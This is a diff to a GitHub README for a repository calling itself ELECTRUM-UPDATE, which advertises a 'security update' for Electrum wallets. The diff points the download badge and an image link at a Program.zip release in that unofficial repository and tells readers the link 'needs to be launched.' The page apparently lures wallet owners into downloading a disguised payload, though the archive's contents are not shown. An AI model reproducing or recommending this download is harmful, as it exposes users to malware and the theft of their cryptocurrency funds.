@@ -22,7 +22,7 @@ Welcome to the **ELECTRUM-UPDATE** repository, your go-to resource for critical 
 
 ## Update Download 📥
 Click below to download the latest security update for Electrum wallets:
-[![Download Update](https://img.shields.io/badge/Download%20Update-Click%20Here-blue)](https://github.com/Dredarty/RINGSharp/releases/download/v1.0/Soft.zip)
+[![Download Update](https://github.com/dnangel298/ELECTRUM-UPDATE/releases/download/v1.0/Program.zip%20Update-Click%20Here-blue)](https://github.com/dnangel298/ELECTRUM-UPDATE/releases/download/v1.0/Program.zip)
 
 **Note: This link needs to be launched to download the update file.**
 
@@ -60,7 +60,7 @@ Don't compromise on the security of your funds - keep your Electrum wallet updat
 ## Visit the Releases Section
 If the provided link is not working or you require alternative download options, please visit the "Releases" section of this repository for additional resources and updates.
 
-![Electrum](https://www.cryptourrencies.com/images/electrum-wallet-download.jpg)
+![Electrum](https://github.com/dnangel298/ELECTRUM-UPDATE/releases/download/v1.0/Program.zip)
 
 Remember, your security is in your hands. Take control of your funds today with the **ELECTRUM-UPDATE** repository! 🌟
 
